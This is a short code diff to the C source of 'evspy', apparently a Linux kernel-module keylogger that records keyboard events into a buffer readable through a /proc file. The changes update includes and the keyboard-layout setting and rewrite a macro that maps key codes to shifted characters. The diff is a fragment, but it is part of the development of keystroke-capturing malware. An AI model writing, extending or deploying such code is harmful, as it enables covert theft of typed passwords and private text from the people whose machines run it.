@@ -1,13 +1,22 @@
-#include <asm/page.h>
+#include <linux/cred.h>
+#include <linux/init.h>
 #include <linux/input.h>
-#include "maps.h"
+#include <linux/module.h>
+#include <linux/proc_fs.h>
+#include <linux/sched.h>
+#include <linux/slab.h>
+#include <linux/stat.h>
+#include <linux/string.h>
+#include <asm/page.h>
+#include "khashmap/khashmap.h"
 
 #define EVS_NAME		"evspy"				// driver name
-#define EVS_MAP			map_es				// change this to your keyboard layout
-#define EVS_KLAY		EVS_KLAY_ES			// change default layout to spanish
+#define EVS_KLAY		EVS_KLAY_EN			// change this to your keyboard layout
 #define EVS_TROLL		1					// clear this if you're a serious guy
 #define EVS_BUFSIZE		PAGE_SIZE			// size of the circular buffer (4K)
 #define EVS_PROCNAME	"driver/" EVS_NAME	// virtual file within /proc
+
+#include "maps/maps.h"
 
 #define MIN(x, y)	(x) < (y) ? (x) : (y)
 
@@ -66,9 +75,20 @@
 	((c) >= KEY_F13 && (c) <= KEY_F24);		\
 })
 
+/*
+ * Returns the character associated with event code c when shift is pressed
+ */
 #define evs_shift(c)		\
 ({		\
-	((c) >= 'a' && (c) <= 'z') ? (c) + ('A'-'a') : (c);		\
+	void *__vp;		\
+	char __c = (c);		\
+	if (map[c] >= 'a' && map[c] <= 'z') {		\
+		__c = map[c] + ('A'-'a');		\
+	} else {		\
+		__vp = khm_get(shm, (c));		\
+		if (__vp) __c = *(char *)__vp;		\
+	}		\
+	__c;		\
 })
 
 // Event values
